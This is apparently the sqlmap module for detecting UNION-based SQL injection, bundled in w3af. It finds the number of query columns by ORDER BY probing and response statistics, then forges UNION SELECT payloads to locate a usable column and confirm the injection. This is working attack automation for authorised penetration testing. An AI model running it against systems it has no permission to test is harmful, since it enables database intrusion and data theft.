#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import logging
import random
import re

from w3af.plugins.attack.db.sqlmap.lib.core.agent import agent
from w3af.plugins.attack.db.sqlmap.lib.core.common import average
from w3af.plugins.attack.db.sqlmap.lib.core.common import Backend
from w3af.plugins.attack.db.sqlmap.lib.core.common import isNullValue
from w3af.plugins.attack.db.sqlmap.lib.core.common import listToStrValue
from w3af.plugins.attack.db.sqlmap.lib.core.common import popValue
from w3af.plugins.attack.db.sqlmap.lib.core.common import pushValue
from w3af.plugins.attack.db.sqlmap.lib.core.common import randomInt
from w3af.plugins.attack.db.sqlmap.lib.core.common import randomStr
from w3af.plugins.attack.db.sqlmap.lib.core.common import readInput
from w3af.plugins.attack.db.sqlmap.lib.core.common import removeReflectiveValues
from w3af.plugins.attack.db.sqlmap.lib.core.common import singleTimeLogMessage
from w3af.plugins.attack.db.sqlmap.lib.core.common import singleTimeWarnMessage
from w3af.plugins.attack.db.sqlmap.lib.core.common import stdev
from w3af.plugins.attack.db.sqlmap.lib.core.common import wasLastResponseDBMSError
from w3af.plugins.attack.db.sqlmap.lib.core.data import conf
from w3af.plugins.attack.db.sqlmap.lib.core.data import kb
from w3af.plugins.attack.db.sqlmap.lib.core.data import logger
from w3af.plugins.attack.db.sqlmap.lib.core.dicts import FROM_DUMMY_TABLE
from w3af.plugins.attack.db.sqlmap.lib.core.enums import PAYLOAD
from w3af.plugins.attack.db.sqlmap.lib.core.settings import LIMITED_ROWS_TEST_NUMBER
from w3af.plugins.attack.db.sqlmap.lib.core.settings import UNION_MIN_RESPONSE_CHARS
from w3af.plugins.attack.db.sqlmap.lib.core.settings import UNION_STDEV_COEFF
from w3af.plugins.attack.db.sqlmap.lib.core.settings import MIN_RATIO
from w3af.plugins.attack.db.sqlmap.lib.core.settings import MAX_RATIO
from w3af.plugins.attack.db.sqlmap.lib.core.settings import MIN_STATISTICAL_RANGE
from w3af.plugins.attack.db.sqlmap.lib.core.settings import MIN_UNION_RESPONSES
from w3af.plugins.attack.db.sqlmap.lib.core.settings import NULL
from w3af.plugins.attack.db.sqlmap.lib.core.settings import ORDER_BY_STEP
from w3af.plugins.attack.db.sqlmap.lib.core.unescaper import unescaper
from w3af.plugins.attack.db.sqlmap.lib.request.comparison import comparison
from w3af.plugins.attack.db.sqlmap.lib.request.connect import Connect as Request

def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL):
    """
    Finds number of columns affected by UNION based injection
    """
    retVal = None

    def _orderByTechnique():
        def _orderByTest(cols):
            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
            return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order by", "unknown column", "failed")) and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I)

        if _orderByTest(1) and not _orderByTest(randomInt()):
            infoMsg = "'ORDER BY' technique appears to be usable. "
            infoMsg += "This should reduce the time needed "
            infoMsg += "to find the right number "
            infoMsg += "of query columns. Automatically extending the "
            infoMsg += "range for current UNION query injection technique test"
            singleTimeLogMessage(infoMsg)

            lowCols, highCols = 1, ORDER_BY_STEP
            found = None
            while not found:
                if _orderByTest(highCols):
                    lowCols = highCols
                    highCols += ORDER_BY_STEP
                else:
                    while not found:
                        mid = highCols - (highCols - lowCols) / 2
                        if _orderByTest(mid):
                            lowCols = mid
                        else:
                            highCols = mid
                        if (highCols - lowCols) < 2:
                            found = lowCols

            return found

    try:
        pushValue(kb.errorIsNone)
        items, ratios = [], []
        kb.errorIsNone = False
        lowerCount, upperCount = conf.uColsStart, conf.uColsStop

        if lowerCount == 1:
            found = kb.orderByColumns or _orderByTechnique()
            if found:
                kb.orderByColumns = found
                infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
                singleTimeLogMessage(infoMsg)
                return found

        if abs(upperCount - lowerCount) < MIN_UNION_RESPONSES:
            upperCount = lowerCount + MIN_UNION_RESPONSES

        min_, max_ = MAX_RATIO, MIN_RATIO
        pages = {}

        for count in range(lowerCount, upperCount + 1):
            query = agent.forgeUnionQuery('', -1, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)
            page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
            if not isNullValue(kb.uChar):
                pages[count] = page
            ratio = comparison(page, headers, code, getRatioValue=True) or MIN_RATIO
            ratios.append(ratio)
            min_, max_ = min(min_, ratio), max(max_, ratio)
            items.append((count, ratio))

        if not isNullValue(kb.uChar):
            for regex in (kb.uChar, r'>\s*%s\s*<' % kb.uChar):
                contains = [(count, re.search(regex, _ or "", re.IGNORECASE) is not None) for count, _ in list(pages.items())]
                if len([_ for _ in contains if _[1]]) == 1:
                    retVal = [_ for _ in contains if _[1]][0][0]
                    break

        if not retVal:
            if min_ in ratios:
                ratios.pop(ratios.index(min_))
            if max_ in ratios:
                ratios.pop(ratios.index(max_))

            minItem, maxItem = None, None

            for item in items:
                if item[1] == min_:
                    minItem = item
                elif item[1] == max_:
                    maxItem = item

            if all(_ == min_ and _ != max_ for _ in ratios):
                retVal = maxItem[0]

            elif all(_ != min_ and _ == max_ for _ in ratios):
                retVal = minItem[0]

            elif abs(max_ - min_) >= MIN_STATISTICAL_RANGE:
                    deviation = stdev(ratios)
                    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation

                    if min_ < lower:
                        retVal = minItem[0]

                    if max_ > upper:
                        if retVal is None or abs(max_ - upper) > abs(min_ - lower):
                            retVal = maxItem[0]
    finally:
        kb.errorIsNone = popValue()

    if retVal:
        infoMsg = "target URL appears to be UNION injectable with %d columns" % retVal
        singleTimeLogMessage(infoMsg, logging.INFO, re.sub(r"\d+", "N", infoMsg))

    return retVal

def _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL):
    validPayload = None
    vector = None

    positions = list(range(0, count))

    # Unbiased approach for searching appropriate usable column
    random.shuffle(positions)

    for charCount in (UNION_MIN_RESPONSE_CHARS << 2, UNION_MIN_RESPONSE_CHARS):
        if vector:
            break

        # For each column of the table (# of NULL) perform a request using
        # the UNION ALL SELECT statement to test it the target URL is
        # affected by an exploitable union SQL injection vulnerability
        for position in positions:
            # Prepare expression with delimiters
            randQuery = randomStr(charCount)
            phrase = "%s%s%s".lower() % (kb.chars.start, randQuery, kb.chars.stop)
            randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
            randQueryUnescaped = unescaper.escape(randQueryProcessed)

            # Forge the union SQL injection request
            query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

            # Perform the request
            page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
            content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "",
                removeReflectiveValues(listToStrValue(headers.headers if headers else None),
                payload, True) or "")

            if content and phrase in content:
                validPayload = payload
                kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, False)

                if where == PAYLOAD.WHERE.ORIGINAL:
                    # Prepare expression with delimiters
                    randQuery2 = randomStr(charCount)
                    phrase2 = "%s%s%s".lower() % (kb.chars.start, randQuery2, kb.chars.stop)
                    randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                    randQueryUnescaped2 = unescaper.escape(randQueryProcessed2)

                    # Confirm that it is a full union SQL injection
                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                    payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                    # Perform the request
                    page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                    content = "%s%s".lower() % (page or "", listToStrValue(headers.headers if headers else None) or "")

                    if not all(_ in content for _ in (phrase, phrase2)):
                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
                    elif not kb.unionDuplicates:
                        fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in range(LIMITED_ROWS_TEST_NUMBER)), randomStr())

                        # Check for limited row output
                        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
                        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

                        # Perform the request
                        page, headers, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
                        content = "%s%s".lower() % (removeReflectiveValues(page, payload) or "",
                            removeReflectiveValues(listToStrValue(headers.headers if headers else None),
                            payload, True) or "")
                        if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                            warnMsg = "output with limited number of rows detected. Switching to partial mode"
                            logger.warn(warnMsg)
                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)

                unionErrorCase = kb.errorIsNone and wasLastResponseDBMSError()

                if unionErrorCase and count > 1:
                    warnMsg = "combined UNION/error-based SQL injection case found on "
                    warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                    warnMsg += "column with better characteristics"
                    logger.warn(warnMsg)
                else:
                    break

    return validPayload, vector

def _unionConfirm(comment, place, parameter, prefix, suffix, count):
    validPayload = None
    vector = None

    # Confirm the union SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count)

    # Assure that the above function found the exploitable full union
    # SQL injection position
    if not validPayload:
        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, where=PAYLOAD.WHERE.NEGATIVE)

    return validPayload, vector

def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    validPayload = None
    vector = None

    # In case that user explicitly stated number of columns affected
    if conf.uColsStop == conf.uColsStart:
        count = conf.uColsStart
    else:
        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)

    if count:
        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

        if not all([validPayload, vector]) and not all([conf.uChar, conf.dbms]):
            warnMsg = "if UNION based SQL injection is not detected, "
            warnMsg += "please consider "

            if not conf.uChar and count > 1 and kb.uChar == NULL:
                message = "injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] "

                if not readInput(message, default="Y", boolean=True):
                    warnMsg += "usage of option '--union-char' "
                    warnMsg += "(e.g. '--union-char=1') "
                else:
                    conf.uChar = kb.uChar = str(randomInt(2))
                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count)

            if not conf.dbms:
                if not conf.uChar:
                    warnMsg += "and/or try to force the "
                else:
                    warnMsg += "forcing the "
                warnMsg += "back-end DBMS (e.g. '--dbms=mysql') "

            if not all([validPayload, vector]) and not warnMsg.endswith("consider "):
                singleTimeWarnMessage(warnMsg)

    return validPayload, vector

def unionTest(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector
